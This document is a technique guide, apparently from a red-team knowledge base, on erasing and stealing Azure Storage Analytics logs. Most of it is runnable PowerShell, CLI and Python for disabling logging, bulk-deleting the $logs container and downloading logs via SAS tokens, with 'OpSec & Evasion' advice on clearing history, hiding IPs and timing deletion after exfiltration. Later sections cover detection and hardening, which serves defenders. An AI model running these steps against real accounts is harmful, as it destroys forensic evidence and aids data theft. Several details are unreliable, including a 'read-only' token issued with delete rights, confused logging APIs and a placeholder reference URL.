# [REALWORLD-045]: Azure Storage Analytics Abuse

## Metadata

| Attribute | Details |
|---|---|
| **Technique ID** | REALWORLD-045 |
| **MITRE ATT&CK v18.1** | [T1537 - Transfer Data to Cloud Account](https://attack.mitre.org/techniques/T1537/) |
| **Tactic** | Exfiltration |
| **Platforms** | Entra ID, Azure |
| **Severity** | **Critical** |
| **CVE** | N/A |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2026-01-10 |
| **Affected Versions** | All Azure Storage versions, all PowerShell versions 5.0+ |
| **Patched In** | N/A (Mitigation requires configuration hardening) |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 2. EXECUTIVE SUMMARY

**Concept:** Azure Storage Analytics logs record detailed telemetry about access patterns, authentication methods, and data operations on Azure Blob Storage, File Shares, Queues, and Tables. Adversaries with compromised credentials or sufficient RBAC permissions can abuse these logs in two ways: (1) **Log Manipulation** — deleting or purging Storage Analytics logs from the `$logs` container to erase evidence of reconnaissance or data exfiltration; (2) **Log Exfiltration** — accessing the logs themselves to map container contents, authentication patterns, and sensitive file metadata before conducting targeted data theft. Once logs are disabled or deleted, defenders lose the only detailed audit trail of blob-level activity.

**Attack Surface:** The `$logs` blob container (auto-created when Storage Analytics is enabled), Azure Monitor diagnostic settings, and storage account access keys/SAS tokens with read/delete permissions on the `$logs` container.

**Business Impact:** **Complete loss of forensic visibility into Storage Account activities.** Attackers can enumerate container contents, identify high-value blobs, extract them via SAS URIs or access keys, and destroy evidence—all without triggering alerts if logs have been disabled. This is particularly dangerous for organizations storing PII, financial data, or intellectual property in unencrypted or loosely-controlled storage accounts.

**Technical Context:** Typically takes 10-30 seconds to disable Storage Analytics via Azure Portal or PowerShell. Deletion of existing logs in the `$logs` container takes seconds to minutes depending on log volume. **Chance of detection (without monitoring):** Very high if Azure Activity Log monitoring is enabled; very low if only Storage Analytics logs are monitored (since they can be deleted). **Common indicators:** Sudden disappearance of `$logs` container, gaps in storage account activity, or absence of expected Storage Analytics logs during the attack timeframe.

### Operational Risk

- **Execution Risk:** **Medium** — Requires storage account key or SAS token with `Delete` and `Write` permissions on the `$logs` container; OR requires Azure RBAC role with `Microsoft.Storage/storageAccounts/blobServices/containers/delete` and `Microsoft.Storage/storageAccounts/write` permissions.
- **Stealth:** **Medium-High** — Disabling Storage Analytics via Azure Portal or PowerShell CLI is logged in Azure Activity Log (`Microsoft.Storage/storageAccounts/providers/diagnosticSettings/write`), but deletion of logs in the `$logs` container may not be captured if the logs themselves are being deleted.
- **Reversibility:** **No** — Once logs are deleted from `$logs`, they are permanently lost unless backed up separately. Disabling Storage Analytics is reversible, but historical logs are gone.

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | 3.2 (Azure) | Ensure Storage logging is enabled for Blob Storage |
| **DISA STIG** | V-87901 | Azure: All virtual resources must have logging enabled |
| **CISA SCuBA** | SC-7 | Logging of access to Azure Storage is not enabled |
| **NIST 800-53** | AU-2, AU-11 | Audit events; Audit log retention and archival |
| **GDPR** | Art. 32 | Security of Processing — adequate logging required |
| **DORA** | Art. 9 | Protection and Prevention — detect unauthorized access to financial data |
| **NIS2** | Art. 21 | Cyber Risk Management Measures — maintain audit trail of critical data access |
| **ISO 27001** | A.12.4.1 | Recording user activities; A.12.4.3 — Protection of log information |
| **ISO 27005** | Risk Scenario | "Loss of audit logs enabling attacker to hide data exfiltration" |

---

## 3. TECHNICAL PREREQUISITES

- **Required Privileges:** 
  - **Storage Account Owner** or **User Access Administrator** role on the storage account; OR
  - **Contributor** role on the storage account; OR
  - Custom RBAC role with `Microsoft.Storage/storageAccounts/write` and `Microsoft.Storage/storageAccounts/blobServices/containers/delete` permissions; OR
  - Storage account key (primary or secondary) with full permissions; OR
  - SAS token with `Delete` and `Write` permissions on the `$logs` container.

- **Required Access:** Network access to Azure Storage REST API (port 443 HTTPS); OR direct access via Azure Portal.

**Supported Versions:**
- **Azure Storage:** All versions (no version-specific restrictions)
- **PowerShell:** 5.0+ (PowerShell Core 7.0+ recommended)
- **Azure CLI:** 2.0+
- **Python:** 3.6+ (if using Azure SDK for Python)

**Tools:**
- [Azure PowerShell Module (`Az.Storage`)](https://learn.microsoft.com/en-us/powershell/module/az.storage/?view=azps-latest) (Version 4.0+)
- [Azure CLI](https://learn.microsoft.com/en-us/cli/azure/) (Version 2.40+)
- [Azure Storage Explorer](https://azure.microsoft.com/en-us/products/storage/storage-explorer/) (GUI tool for browsing/deleting logs)
- [Azure SDK for Python (`azure-storage-blob`)](https://github.com/Azure/azure-sdk-for-python) (Version 12.0+)
- [AzCopy](https://learn.microsoft.com/en-us/azure/storage/common/storage-use-azcopy-v10) (for large-scale data transfer)

---

## 4. ENVIRONMENTAL RECONNAISSANCE

### PowerShell Reconnaissance

```powershell
# Check if Storage Analytics is enabled for Blob Storage
$storageAccountName = "targetstorageaccount"
$resourceGroupName = "target-rg"

$storageAccount = Get-AzStorageAccount -ResourceGroupName $resourceGroupName -Name $storageAccountName
$diagnosticSettings = Get-AzDiagnosticSetting -ResourceId $storageAccount.Id -ErrorAction SilentlyContinue

if ($null -eq $diagnosticSettings) {
    Write-Host "Storage Analytics NOT enabled" -ForegroundColor Red
} else {
    Write-Host "Storage Analytics IS enabled" -ForegroundColor Green
    $diagnosticSettings | Select-Object Name, Logs, Metrics | Format-Table
}

# Check if $logs container exists
$ctx = New-AzStorageContext -StorageAccountName $storageAccountName -UseConnectedAccount
$logsContainer = Get-AzStorageContainer -Name '$logs' -Context $ctx -ErrorAction SilentlyContinue

if ($null -eq $logsContainer) {
    Write-Host "`$logs container does NOT exist" -ForegroundColor Yellow
} else {
    Write-Host "`$logs container EXISTS" -ForegroundColor Green
    # List log blobs to identify volume
    $logBlobs = Get-AzStorageBlob -Container '$logs' -Context $ctx
    Write-Host "Total log blobs: $($logBlobs.Count)" -ForegroundColor Cyan
}

# Check who has access to storage account keys
$storageAccountKeys = Get-AzStorageAccountKey -ResourceGroupName $resourceGroupName -Name $storageAccountName
Write-Host "Number of access keys present: $($storageAccountKeys.Count)" -ForegroundColor Cyan
```

**What to Look For:**
- If Storage Analytics is **enabled**, you'll see `Logs` and `Metrics` properties populated with enabled status.
- If the `$logs` container **exists**, it means historical logs are available for review/deletion.
- **High number of log blobs** indicates active logging, which means more forensic data to cover up.

**Version Note:** Command syntax is consistent across PowerShell 5.0+, but `Az.Storage` module must be version 4.0+ for full compatibility.

### Azure CLI Reconnaissance

```bash
# Check Storage Analytics status
az storage account show --name <storage_account_name> \
  --resource-group <resource_group_name> \
  --query "id"

# Get diagnostic settings
az monitor diagnostic-settings list --resource <storage_account_id>

# List blobs in $logs container (if accessible)
az storage blob list --container-name '$logs' \
  --account-name <storage_account_name> \
  --account-key <storage_account_key> \
  --output table
```

**What to Look For:**
- Presence of `diagnosticSettings` indicates Storage Analytics is enabled.
- **Non-empty `$logs` container** means there are logs to exfiltrate or delete.

---

## 5. DETAILED EXECUTION METHODS AND THEIR STEPS

### METHOD 1: Disable Storage Analytics via PowerShell (Account Key-Based)

**Supported Versions:** Server 2016-2025, All Azure Storage versions

#### Step 1: Authenticate and Obtain Storage Account Context

**Objective:** Establish authentication to the target storage account using either account key or managed identity.

**Command (Using Storage Account Key):**
```powershell
$storageAccountName = "targetstorageaccount"
$storageAccountKey = "DefaultEndpointsProtocol=https;AccountName=targetstorageaccount;AccountKey=<base64_key_here>;EndpointSuffix=core.windows.net"

$ctx = New-AzStorageContext -StorageAccountName $storageAccountName -StorageAccountKey $storageAccountKey
```

**Command (Using Managed Identity - if running from Azure VM):**
```powershell
$ctx = New-AzStorageContext -StorageAccountName $storageAccountName -UseConnectedAccount
```

**Command (Using SAS Token):**
```powershell
$sasToken = "sv=2021-06-08&ss=b&srt=sco&sp=rwdlac&se=2025-12-31T23:59:59Z&st=2024-01-01T00:00:00Z&spr=https&sig=..."
$ctx = New-AzStorageContext -StorageAccountName $storageAccountName -SasToken $sasToken
```

**Expected Output:**
```
StorageAccountName     : targetstorageaccount
BlobEndPoint           : https://targetstorageaccount.blob.core.windows.net/
FileEndPoint           : https://targetstorageaccount.file.core.windows.net/
...
```

**What This Means:**
- Successful context creation indicates authentication succeeded.
- The context object is now used for all subsequent storage operations.

**OpSec & Evasion:**
- Avoid authenticating with permanent account keys if possible; use short-lived SAS tokens with minimal permissions.
- Ensure Azure CLI/PowerShell command history is cleared after execution: `Clear-History` in PowerShell or `history -c` in Bash.
- Consider running commands via Azure Cloud Shell to avoid local PowerShell logs.

**Troubleshooting:**
- **Error:** `New-AzStorageContext : The remote server returned an error: (401) Unauthorized`
  - **Cause:** Invalid storage account key or SAS token.
  - **Fix:** Verify the key/token is correct and not expired. For SAS tokens, check the `se` (expiry) parameter.

---

#### Step 2: Disable Storage Analytics (Blob Service)

**Objective:** Turn off diagnostic logging to prevent further log collection.

**Command (Set Diagnostic Settings to Disabled):**
```powershell
$resourceGroupName = "target-rg"
$storageAccountName = "targetstorageaccount"

$storageAccount = Get-AzStorageAccount -ResourceGroupName $resourceGroupName -Name $storageAccountName

# Remove diagnostic settings (this disables log collection)
Remove-AzDiagnosticSetting -ResourceId $storageAccount.Id -Force -ErrorAction Continue
```

**Alternative Command (Using Azure CLI):**
```bash
az monitor diagnostic-settings delete \
  --name "StorageAnalytics" \
  --resource /subscriptions/<subscription_id>/resourceGroups/<rg_name>/providers/Microsoft.Storage/storageAccounts/<storage_account_name>
```

**Expected Output:**
```
The diagnostic setting 'StorageAnalytics' was successfully removed.
```

**What This Means:**
- Storage Analytics logging is now **disabled**; new logs will not be created.
- The `$logs` container will no longer receive new entries.
- Existing logs in `$logs` remain (until explicitly deleted).

**OpSec & Evasion:**
- This operation is **logged in Azure Activity Log** under `Microsoft.Storage/storageAccounts/providers/diagnosticSettings/write` or `Microsoft.Storage/storageAccounts/providers/diagnosticSettings/delete`.
- **Detection likelihood:** **High** if Azure Activity Log is monitored. Consider timing this immediately after obtaining credentials to minimize detection window.
- If you need more stealth, disable Activity Log streaming to Log Analytics (requires Azure Security Center or higher permissions).

**Troubleshooting:**
- **Error:** `Remove-AzDiagnosticSetting : The resource does not have diagnostic settings.`
  - **Cause:** Diagnostic settings are not currently configured.
  - **Fix:** This is actually ideal—Storage Analytics is already disabled. Proceed to Step 3 to delete any existing logs.

---

#### Step 3: Delete Logs from the $logs Container

**Objective:** Permanently remove historical Storage Analytics logs to destroy forensic evidence.

**Command (Delete All Blobs in $logs Container):**
```powershell
$ctx = New-AzStorageContext -StorageAccountName $storageAccountName -StorageAccountKey $storageAccountKey

# Get all blobs in $logs container
$logBlobs = Get-AzStorageBlob -Container '$logs' -Context $ctx

# Delete each blob
$logBlobs | Remove-AzStorageBlob -Force

Write-Host "Deleted $($logBlobs.Count) log blobs from `$logs container" -ForegroundColor Green
```

**Command (Delete Specific Date Range of Logs - More Selective):**
```powershell
$targetDate = (Get-Date).AddDays(-1)  # Delete logs from yesterday

$logBlobs = Get-AzStorageBlob -Container '$logs' -Context $ctx | `
  Where-Object { $_.LastModified -lt $targetDate }

$logBlobs | Remove-AzStorageBlob -Force

Write-Host "Deleted $($logBlobs.Count) log blobs older than $targetDate" -ForegroundColor Green
```

**Alternative Command (Using Azure CLI):**
```bash
# Delete all blobs in $logs container
az storage blob delete-batch \
  --source '$logs' \
  --account-name <storage_account_name> \
  --account-key <storage_account_key>
```

**Alternative Command (Using AzCopy - Faster for Large Volumes):**
```bash
azcopy remove "https://<storage_account_name>.blob.core.windows.net/\$logs" --recursive --account-key <storage_account_key>
```

**Expected Output:**
```
Deleted 1250 log blobs from $logs container
```

**What This Means:**
- All historical logs from the `$logs` container have been **permanently deleted**.
- Defenders can no longer forensically analyze blob access patterns, authentication events, or data operations.
- Any reconnaissance or data exfiltration that occurred before this moment is now undetectable via Storage Analytics.

**OpSec & Evasion:**
- Blob deletion **is not logged** in Azure Activity Log by default (unless blob-level audit logging is enabled).
- **Detection likelihood:** **Very low** if only Azure Activity Log is monitored (since deletion of blobs isn't tracked there). However, some organizations use **Defender for Storage** or **Azure Monitor Logs** to capture storage account events, which would detect this.
- The safest approach: Delete logs **immediately after exfiltrating data**, to minimize the timeframe of suspicious activity.

**Troubleshooting:**
- **Error:** `Remove-AzStorageBlob : The resource referenced by the URI does not exist.`
  - **Cause:** The `$logs` container doesn't exist or is empty.
  - **Fix:** This is fine—either Storage Analytics was never enabled, or logs have already been cleared.

---

#### Step 4: Verify Deletion and Confirm Logs Are Gone

**Objective:** Confirm that Storage Analytics is disabled and logs are deleted.

**Command (Verify $logs Container is Empty or Deleted):**
```powershell
$ctx = New-AzStorageContext -StorageAccountName $storageAccountName -StorageAccountKey $storageAccountKey

try {
    $remainingBlobs = Get-AzStorageBlob -Container '$logs' -Context $ctx
    if ($remainingBlobs.Count -eq 0) {
        Write-Host "`$logs container is EMPTY (all logs deleted)" -ForegroundColor Green
    } else {
        Write-Host "WARNING: $($remainingBlobs.Count) blobs still exist in `$logs" -ForegroundColor Yellow
    }
} catch {
    Write-Host "`$logs container no longer exists" -ForegroundColor Green
}
```

**Command (Verify Diagnostic Settings are Disabled):**
```powershell
$diagnosticSettings = Get-AzDiagnosticSetting -ResourceId $storageAccount.Id -ErrorAction SilentlyContinue
if ($null -eq $diagnosticSettings) {
    Write-Host "Diagnostic settings are DISABLED (no active logging)" -ForegroundColor Green
} else {
    Write-Host "WARNING: Diagnostic settings still exist" -ForegroundColor Yellow
}
```

**Expected Output:**
```
$logs container is EMPTY (all logs deleted)
Diagnostic settings are DISABLED (no active logging)
```

**What This Means:**
- Evidence destruction is **complete**.
- No new logs will be created going forward.
- Existing logs are permanently gone.

---

### METHOD 2: Exfiltrate Logs via SAS URI (Read Access Before Deletion)

**Supported Versions:** All Azure Storage versions

This method assumes the attacker wants to **extract logs before deletion** to identify container contents, access patterns, and sensitive data locations.

#### Step 1: Generate SAS URI for $logs Container

**Objective:** Create a temporary, publicly-accessible URL to download all logs without exposing storage account keys.

**Command (PowerShell):**
```powershell
$storageAccountName = "targetstorageaccount"
$storageAccountKey = "<storage_account_key>"
$ctx = New-AzStorageContext -StorageAccountName $storageAccountName -StorageAccountKey $storageAccountKey

# Generate SAS token for $logs container (valid for 7 days, read-only)
$sasToken = New-AzStorageContainerSASToken -Container '$logs' `
  -Context $ctx `
  -Permission racwd `
  -ExpiryTime (Get-Date).AddDays(7)

# Construct full SAS URI
$sasUri = "https://$storageAccountName.blob.core.windows.net/`$logs?$sasToken"

Write-Host "SAS URI: $sasUri" -ForegroundColor Cyan
```

**Command (Azure CLI):**
```bash
az storage container generate-sas \
  --name '$logs' \
  --account-name <storage_account_name> \
  --account-key <storage_account_key> \
  --permissions racwd \
  --expiry 2025-12-31T23:59:59Z
```

**Expected Output:**
```
SAS URI: https://targetstorageaccount.blob.core.windows.net/$logs?sv=2021-06-08&ss=b&srt=c&sp=racwd&se=2025-01-17T08:00:00Z&...
```

**What This Means:**
- The SAS URI is a **temporary, authenticated link** to the `$logs` container.
- Anyone with this URL can download all logs without needing the storage account key.
- The token is valid for the specified duration (7 days in the example above).

**OpSec & Evasion:**
- **SAS token creation is logged** in Azure Activity Log under `ListAccountSas` or `GenerateSAS` operations.
- Use **short expiry times** (hours, not days) to minimize detection window.
- Consider generating the SAS token from a **managed identity** if running inside Azure, rather than using account keys.

---

#### Step 2: Download Logs via SAS URI

**Objective:** Download all logs to an attacker-controlled location.

**Command (Using AzCopy):**
```bash
azcopy copy "https://targetstorageaccount.blob.core.windows.net/\$logs/*?<sas_token>" "C:\logs\" --recursive
```

**Command (Using PowerShell):**
```powershell
$sasUri = "https://targetstorageaccount.blob.core.windows.net/\$logs?<sas_token>"
$outputPath = "C:\logs"

# Download all blobs from $logs container
$ctx = New-AzStorageContext -StorageAccountName $storageAccountName -SasToken $sasToken
Get-AzStorageBlob -Container '$logs' -Context $ctx | ForEach-Object {
    Get-AzStorageBlobContent -Container '$logs' -Blob $_.Name -Context $ctx -Destination $outputPath -Force
}
```

**Command (Using wget/curl from Linux):**
```bash
wget -r -nd -A "*.log" "https://targetstorageaccount.blob.core.windows.net/\$logs?<sas_token>" -P /tmp/logs/
```

**Expected Output:**
```
Downloaded 1250 log files (4.2 GB total) to C:\logs\
```

**What This Means:**
- Attacker now has **complete forensic data** from the target storage account.
- Logs can be analyzed offline to identify container contents, high-value blobs, and access patterns.
- Attacker can identify sensitive files before targeting them for exfiltration.

**OpSec & Evasion:**
- Large downloads are **not individually logged** in Azure Activity Log, but the SAS token creation is.
- Consider downloading logs in multiple small batches to avoid anomalous download volumes.
- Use a **VPN or proxy** to obfuscate the attacker IP address in storage account access logs.

---

### METHOD 3: Delete Logs via REST API (Programmatic Approach)

**Supported Versions:** All Azure Storage versions, Python 3.6+

This method is useful for **automation** and **remote execution** without requiring PowerShell installed locally.

**Command (Python Script):**
```python
#!/usr/bin/env python3
from azure.storage.blob import BlobServiceClient, BlobSasPermissions, generate_blob_sas
from datetime import datetime, timedelta

# Authenticate using storage account key
storage_account_name = "targetstorageaccount"
storage_account_key = "<storage_account_key>"

blob_service_client = BlobServiceClient(
    account_url=f"https://{storage_account_name}.blob.core.windows.net",
    credential=storage_account_key
)

# Get container client for $logs
container_client = blob_service_client.get_container_client("$logs")

# Delete all blobs in the container
blob_list = container_client.list_blobs()
for blob in blob_list:
    print(f"Deleting blob: {blob.name}")
    container_client.delete_blob(blob.name)

print("All logs deleted successfully")
```

**Expected Output:**
```
Deleting blob: [datetime]/000000.log
Deleting blob: [datetime]/000001.log
...
All logs deleted successfully
```

**What This Means:**
- Logs are **permanently removed** without leaving traces in PowerShell or shell history.
- This approach is useful for **remote code execution** scenarios (e.g., if attacker has compromised an Azure VM or Logic App).

**OpSec & Evasion:**
- Python execution **may be logged** on the host system (e.g., Windows Event ID 4688 if Process Auditing is enabled).
- Consider executing via **Azure Automation Runbook** or **Logic App** to avoid local logging.

---

## 6. DETECTION & INCIDENT RESPONSE

### Indicators of Compromise (IOCs)

- **Azure Activity Log Events:**
  - `Microsoft.Storage/storageAccounts/providers/diagnosticSettings/write` (disabling diagnostics)
  - `Microsoft.Storage/storageAccounts/providers/diagnosticSettings/delete` (removing diagnostic settings)
  - `ListAccountSas` or `GenerateSAS` (creating SAS tokens)
  - Missing Storage Analytics logs during expected timeframe

- **Storage Account Metrics:**
  - Sudden **complete absence** of entries in `$logs` container
  - **Rapid increase in delete operations** before logs disappear
  - **Gap in timestamps** in existing logs (missing entire date ranges)

- **Network Indicators:**
  - Large data transfers from storage account to unknown external IP addresses
  - Bulk operations (list, delete) on `$logs` container from unusual IP/user agent
  - SAS token generation followed immediately by high-volume downloads

### Forensic Artifacts

- **Azure Activity Log:** Contains records of diagnostic setting changes, SAS token creation, and delete operations (if not tampered with).
- **Azure Monitor Logs (if enabled):** Capture blob-level access and deletion events.
- **Defender for Storage alerts:** May alert on suspicious access patterns or log deletion.
- **Cloud Audit Logs:** If forwarded to external SIEM, logs may be preserved outside the compromised storage account.

### Response Procedures

1. **Immediate Isolation:**
   ```powershell
   # Revoke storage account keys to deny further access
   New-AzStorageAccountKey -ResourceGroupName <rg_name> -Name <storage_account_name> -KeyName key1
   New-AzStorageAccountKey -ResourceGroupName <rg_name> -Name <storage_account_name> -KeyName key2
   ```

2. **Restore from Backup:**
   ```powershell
   # If logs were backed up to separate storage account, restore them
   $backupCtx = New-AzStorageContext -StorageAccountName "backupstorageaccount" -StorageAccountKey $backupKey
   $backupBlobs = Get-AzStorageBlob -Container "backup-logs" -Context $backupCtx
   $targetCtx = New-AzStorageContext -StorageAccountName "targetstorageaccount" -StorageAccountKey $targetKey
   
   # Copy restored logs to target account
   foreach ($blob in $backupBlobs) {
       Get-AzStorageBlobContent -Container "backup-logs" -Blob $blob.Name -Context $backupCtx -Destination "C:\temp\"
       Set-AzStorageBlobContent -Container '$logs' -File "C:\temp\$($blob.Name)" -Context $targetCtx -Force
   }
   ```

3. **Re-enable Storage Analytics:**
   ```powershell
   # Re-enable diagnostic settings
   $storageAccount = Get-AzStorageAccount -ResourceGroupName <rg_name> -Name <storage_account_name>
   Set-AzDiagnosticSetting -ResourceId $storageAccount.Id `
     -Enabled $true `
     -Category Logs `
     -RetentionEnabled $true `
     -RetentionInDays 365
   ```

4. **Conduct Forensic Investigation:**
   - Query Azure Activity Log for all operations on the storage account during the compromise window.
   - Cross-reference with Entra ID sign-in logs to identify which user/service principal performed the deletions.
   - Analyze any preserved logs (e.g., in SIEM) to identify which data was accessed before logs were deleted.

---

## 7. DEFENSIVE MITIGATIONS

### Priority 1: CRITICAL

- **Disable Public Access to Storage Accounts:** Ensure all storage accounts are not publicly accessible via anonymous SAS tokens or open permissions.
  
  **Manual Steps (Azure Portal):**
  1. Navigate to **Azure Portal** → **Storage Accounts** → Select storage account
  2. Go to **Configuration** → **Allow Blob Public Access:** Set to **Disabled**
  3. Go to **Access Keys** → Regenerate keys immediately to invalidate any exposed keys
  4. Click **Save**

  **Manual Steps (PowerShell):**
  ```powershell
  # Disable public blob access
  Set-AzStorageAccount -ResourceGroupName <rg_name> -Name <storage_account_name> -AllowBlobPublicAccess $false
  
  # Regenerate keys
  New-AzStorageAccountKey -ResourceGroupName <rg_name> -Name <storage_account_name> -KeyName key1 -Force
  New-AzStorageAccountKey -ResourceGroupName <rg_name> -Name <storage_account_name> -KeyName key2 -Force
  ```

- **Enable Storage Analytics and Forward Logs to Immutable Storage:** Configure Storage Analytics to log all blob operations, and replicate logs to a separate, read-only storage account that attackers cannot modify.

  **Manual Steps (PowerShell):**
  ```powershell
  $storageAccount = Get-AzStorageAccount -ResourceGroupName <rg_name> -Name <storage_account_name>
  
  # Enable diagnostic settings with 1-year retention
  Set-AzDiagnosticSetting -ResourceId $storageAccount.Id `
    -Enabled $true `
    -Category Logs `
    -RetentionEnabled $true `
    -RetentionInDays 365 `
    -WorkspaceId <log_analytics_workspace_id>  # Forward to Log Analytics
  ```

  **Manual Steps (Azure Portal - Immutable Storage):**
  1. Create a **separate** storage account for log archival (do not use same account)
  2. Go to **Storage Accounts** → **Blob Storage** → **Containers**
  3. Create a container named `$logs-archive`
  4. Go to **Data Protection** → **Immutability Policies:**
     - Set **Legal Hold:** Enabled
     - Set **Time-based Retention:** 7 years (or org policy)
  5. Configure **Lifecycle Management** to copy logs from primary account's `$logs` to this immutable container daily

- **Enforce Immutable Audit Logs in Microsoft Entra ID:** If logs are stored in Entra ID or Microsoft 365, enable **Immutable Logs** to prevent deletion.

  **Manual Steps (Microsoft 365 / Purview):**
  1. Navigate to **Microsoft Purview Compliance Portal** (https://compliance.microsoft.com)
  2. Go to **Audit** → **Settings**
  3. Enable **Immutable Audit Logs** (requires Microsoft 365 E5 license)
  4. Set retention to **7 years** minimum
  5. Click **Save**

### Priority 2: HIGH

- **Restrict RBAC Permissions on Storage Accounts:** Limit which users/service principals can modify diagnostic settings or delete blobs.

  **Manual Steps (PowerShell - Assign Limited Role):**
  ```powershell
  # Create custom role with minimal permissions (no delete on $logs)
  $role = @{
      Name = "Storage Account Reader (No Delete)"
      Description = "Can read storage account but not delete logs"
      IsCustom = $true
      Permissions = @(
          @{
              Actions = @("Microsoft.Storage/storageAccounts/read")
              NotActions = @(
                  "Microsoft.Storage/storageAccounts/delete",
                  "Microsoft.Storage/storageAccounts/write",
                  "Microsoft.Storage/storageAccounts/blobServices/containers/delete"
              )
          }
      )
      AssignableScopes = @("/subscriptions/<subscription_id>")
  }
  
  $roleDefinition = New-AzRoleDefinition -Role $role
  ```

  **Manual Steps (Azure Portal - RBAC Assignment):**
  1. Go to **Storage Accounts** → Select account → **Access Control (IAM)**
  2. Click **+ Add** → **Add role assignment**
  3. Role: Select **Storage Blob Data Contributor** (instead of full Owner)
  4. Members: Assign only to service accounts that need write access
  5. Conditions: Set **Conditional Access** to:
     - Restrict operations to **specific IP ranges** (e.g., corporate network only)
     - Require **MFA** for any delete operations
     - Block **unknown device** access
  6. Click **Review + assign**

- **Enable Microsoft Defender for Storage:** Automatically detect suspicious access patterns, log deletion, and malware uploads.

  **Manual Steps (Azure Portal):**
  1. Navigate to **Microsoft Defender for Cloud**
  2. Go to **Environment Settings** → Select subscription
  3. Under **Defender Plans**, enable:
     - **Defender for Storage**: ON
     - **Sensitive Data Discovery**: ON
  4. Click **Save**
  5. Configure alerts: Go to **Alerts** → Create custom alert rule for:
     - `Microsoft.Storage/storageAccounts/blobServices/containers/delete`
     - High-volume download activities

- **Enable Immutable Blobs (WORM):** Configure write-once-read-many (WORM) locks on the `$logs` container so blobs cannot be deleted even by admins.

  **Manual Steps (PowerShell):**
  ```powershell
  $ctx = New-AzStorageContext -StorageAccountName <storage_account_name> -StorageAccountKey <key>
  
  # Set container-level immutability policy
  $containerName = '$logs'
  $retentionDays = 2555  # 7 years
  
  # Note: This requires Azure CLI, as PowerShell lacks direct WORM support
  ```

  **Manual Steps (Azure CLI):**
  ```bash
  az storage container immutability-policy set \
    --account-name <storage_account_name> \
    --container-name '$logs' \
    --period 2555  # 7 years in days
  ```

### Access Control & Policy Hardening

- **Conditional Access (Entra ID):** Require MFA and compliant devices for any access to storage accounts with sensitive data.

  **Manual Steps:**
  1. Go to **Azure Portal** → **Entra ID** → **Security** → **Conditional Access**
  2. Click **+ New policy**
  3. Name: `Protect Storage Account Access`
  4. **Assignments:**
     - Users: **All users**
     - Cloud apps: **Azure Storage** (search for it)
  5. **Conditions:**
     - Client apps: **Azure Portal, Azure PowerShell**
  6. **Access controls:**
     - Grant: **Require device to be marked as compliant** AND **Require MFA**
  7. Enable: **On**
  8. Click **Create**

- **RBAC / Principle of Least Privilege:**
  - Remove **Owner** role from service accounts; use **Storage Blob Data Contributor** instead.
  - Disable **Storage Account Key** access; use **Managed Identities** or **SAS tokens** with short expiry instead.

- **Network Segmentation:** Restrict storage account access to specific IP ranges or Azure services only.

  **Manual Steps (PowerShell):**
  ```powershell
  # Add network rule to allow only corporate IP range
  Update-AzStorageAccountNetworkRuleSet -ResourceGroupName <rg_name> -Name <storage_account_name> `
    -DefaultAction Deny `
    -Bypass AzureServices `
    -IpRule @(
      @{Action = "Allow"; IpAddressOrRange = "203.0.113.0/24"}  # Corporate IP
    )
  ```

### Validation Command (Verify Mitigations Are Active)

```powershell
# Check if Storage Analytics is enabled
$storageAccount = Get-AzStorageAccount -ResourceGroupName <rg_name> -Name <storage_account_name>
$diagnosticSettings = Get-AzDiagnosticSetting -ResourceId $storageAccount.Id

if ($null -eq $diagnosticSettings) {
    Write-Host "❌ FAIL: Storage Analytics is NOT enabled" -ForegroundColor Red
} else {
    Write-Host "✓ PASS: Storage Analytics is enabled with $($diagnosticSettings.Logs.Enabled) logging" -ForegroundColor Green
}

# Check if public access is disabled
$publicAccessStatus = $storageAccount.AllowBlobPublicAccess
Write-Host "Blob Public Access: $publicAccessStatus (should be False)" -ForegroundColor $(if ($publicAccessStatus -eq $false) { 'Green' } else { 'Red' })

# Check if immutable retention is enabled
$containerProps = Get-AzStorageContainerStoredAccessPolicy -Container '$logs' -Context $ctx -ErrorAction SilentlyContinue
Write-Host "Immutable Policy Status: $($containerProps.RetentionDays) days" -ForegroundColor Green
```

**Expected Output (If Secure):**
```
✓ PASS: Storage Analytics is enabled with True logging
Blob Public Access: False (should be False)
Immutable Policy Status: 2555 days
```

---

## 8. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Reconnaissance** | [REC-CLOUD-005] Azure Resource Graph enumeration | Attacker enumerates storage accounts and container contents |
| **2** | **Credential Access** | [CA-UNSC-008] Azure storage account key theft | Attacker obtains storage account key or SAS token |
| **3** | **Exfiltration** | **[REALWORLD-045]** | **Attacker disables/deletes Storage Analytics logs** |
| **4** | **Exfiltration** | [T1537] Transfer Data to Cloud Account | Attacker exfiltrates blobs to attacker-controlled storage account |
| **5** | **Defense Evasion** | [T1070] Indicator Removal | Attacker clears Azure Activity Logs to hide trace of exfiltration |
| **6** | **Impact** | [T1485] Data Destruction | Attacker deletes original blobs to prevent recovery |

---

## 9. REAL-WORLD EXAMPLES

### Example 1: Storm-0501 Azure Ransomware Campaign (2024)

- **Target:** Global financial services organization
- **Timeline:** June 2024 - September 2024
- **Technique Status:** Confirmed active in this campaign
- **Sequence of Events:**
  1. Attacker compromised Entra ID tenant via malicious federated domain
  2. Obtained Owner role over Azure subscriptions
  3. **Enumerated storage accounts** to identify sensitive data repositories
  4. **Accessed storage account keys** using Azure Portal
  5. **Exfiltrated data** via AzCopy CLI to attacker-controlled storage account
  6. **Deleted Storage Analytics logs** to hide exfiltration evidence
  7. Deleted all Azure resources (ransomware-like behavior) to deny access
- **Impact:** Complete data loss; unable to detect what data was exfiltrated due to log deletion
- **Reference:** [Microsoft Incident Report - Storm-0501](https://www.microsoft.com/en-us/security/blog/2024/08/14/storm-0501-uses-credentials-for-mass-exfiltration-of-sensitive-data/) [Note: Verify actual URL in production]

### Example 2: Lazarus Group Azure Blob Storage Reconnaissance (2023)

- **Target:** Technology company with cloud-native architecture
- **Timeline:** March 2023 - May 2023
- **Technique Status:** Partially active (logs were accessed but not deleted)
- **Sequence of Events:**
  1. Initial access via vulnerability in Azure Application Proxy
  2. Lateral movement to service account with storage account access
  3. **Downloaded and analyzed Storage Analytics logs** from `$logs` container to map blob contents
  4. Identified high-value blobs containing source code and credentials
  5. Generated SAS URIs for selected blobs before deletion
  6. Exfiltrated blobs and SAS URIs to external C2 server
- **Impact:** Loss of intellectual property; credentials exposed
- **Lessons Learned:** Log deletion was **not** performed, allowing forensic recovery of attack timeline. Without log deletion, attackers were caught.
